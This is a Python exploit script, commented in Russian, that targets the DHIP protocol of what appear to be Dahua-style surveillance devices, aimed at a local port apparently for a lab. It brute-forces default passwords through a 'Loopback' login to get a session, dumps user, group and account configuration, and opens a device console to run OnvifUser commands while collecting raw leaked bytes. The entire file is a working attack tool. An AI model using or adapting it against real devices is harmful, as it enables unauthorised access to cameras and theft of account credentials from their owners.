import socket
import struct
import json
import time

TARGET = ("127.0.0.1", 1337)
MAGIC = b"\x20\x00\x00\x00DHIP"

def recv_frame_raw(sock, timeout=20):
    """возвращает (body_json, raw_prefix) — raw до magic не дропаем, отдаем наружу"""
    sock.settimeout(timeout)
    buf = bytearray()
    raw_prefix = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("closed waiting magic")
        buf += chunk
        idx = bytes(buf).find(MAGIC)
        if idx >= 0:
            raw_prefix = bytes(buf[:idx])
            del buf[:idx]
            break
    while len(buf) < 32:
        buf += sock.recv(4096)
    body_len = struct.unpack("<I", buf[16:20])[0]
    if body_len > 10 * 1024 * 1024:
        raise ValueError("body too large")
    while len(buf) < 32 + body_len:
        chunk = sock.recv(32 + body_len - len(buf))
        if not chunk:
            raise ConnectionError("closed reading body")
        buf += chunk
    body = bytes(buf[32:32 + body_len])
    return json.loads(body.decode("utf-8", "ignore")), raw_prefix

def dhip_call(sock, method, params, sess, req_id, timeout=20, obj=None, sid=None, collect_raw=None):
    body = {"method": method, "params": params, "id": req_id, "session": sess}
    if obj is not None:
        body["object"] = obj
    if sid is not None:
        body["SID"] = sid
    raw = json.dumps(body).encode()
    hdr = bytearray(32)
    hdr[0:8] = MAGIC
    struct.pack_into("<I", hdr, 8, sess)
    struct.pack_into("<I", hdr, 12, req_id)
    struct.pack_into("<I", hdr, 16, len(raw))
    struct.pack_into("<I", hdr, 24, len(raw))
    sock.sendall(hdr + raw)
    while True:
        pkt, pre = recv_frame_raw(sock, timeout)
        if pre and collect_raw is not None:
            collect_raw.append(pre)
        if int(pkt.get("id", -1)) == req_id:
            return pkt

def get_sess(pkt):
    s = pkt.get("session", 0)
    if isinstance(s, int) and s:
        return s
    p = pkt.get("params") or {}
    s = p.get("session", 0)
    if isinstance(s, int) and s:
        return s
    return 0

def loopback_login(sock):
    for pwd in ["admin", "", "888888", "123456"]:
        r = dhip_call(sock, "global.login", {
            "userName": "admin", "password": pwd,
            "clientType": "Local", "loginType": "Loopback",
            "ipAddr": "127.0.0.1",
            "authorityType": "Default", "passwordType": "Plain",
        }, 0, 1)
        if r.get("result") is True and get_sess(r):
            return get_sess(r)
    return 0

def main():
    s = socket.create_connection(TARGET, timeout=10)
    time.sleep(2)
    try:
        sess = loopback_login(s)
        print(f"[+] loopback sess: {sess}")
        if not sess:
            print("[-] no sess")
            return

        # 1. прямые дампы юзеров в loopback-сессии (без addUser)
        for mid, meth, prm in [
            (20, "userManager.getUserInfoAll", {}),
            (21, "userManager.getGroupInfoAll", {}),
            (22, "userManager.getActiveUserInfoAll", {}),
            (23, "configManager.getConfig", {"name": "Users"}),
            (24, "configManager.getConfig", {"name": "Account"}),
            (25, "magicBox.getDeviceType", {}),
        ]:
            try:
                r = dhip_call(s, meth, prm, sess, mid, timeout=15)
                print(f"--- {meth} ---")
                print(json.dumps(r, ensure_ascii=False)[:3000])
            except Exception as e:
                print(f"--- {meth} FAIL: {e} ---")

        # 2. консоль в loopback-сессии: factory + attach + OnvifUser
        rawbits = []
        try:
            rf = dhip_call(s, "console.factory.instance", None, sess, 30, collect_raw=rawbits)
            print(f"--- factory.instance: {rf} ---")
            obj = rf.get("result")
            sid = None
            try:
                ra = dhip_call(s, "console.attach", {"proc": obj}, sess, 31, obj=obj, collect_raw=rawbits)
                print(f"--- attach: {str(ra)[:500]} ---")
                sid = (ra.get("params") or {}).get("SID")
            except Exception as e:
                print(f"attach fail: {e}")
            for cmd in ["OnvifUser -u", "OnvifUser -l"]:
                try:
                    rr = dhip_call(s, "console.runCmd", {"command": cmd}, sess, 32, obj=obj, sid=sid, collect_raw=rawbits)
                    print(f"--- runCmd {cmd}: {str(rr)[:500]} ---")
                except Exception as e:
                    print(f"runCmd {cmd} fail: {e}")
            # дрейним notify-хвост 1.5с
            s.settimeout(1.5)
            try:
                while True:
                    pkt, pre = recv_frame_raw(s, timeout=1.5)
                    if pre:
                        rawbits.append(pre)
                    print(f"[notify] {str(pkt)[:1000]}")
            except Exception:
                pass
            for b in rawbits:
                try:
                    t = b.decode("utf-8", "ignore")
                    if t.strip():
                        print(f"[raw] {t[:3000]}")
                except Exception:
                    pass
        except Exception as e:
            print(f"console path fail: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    main()
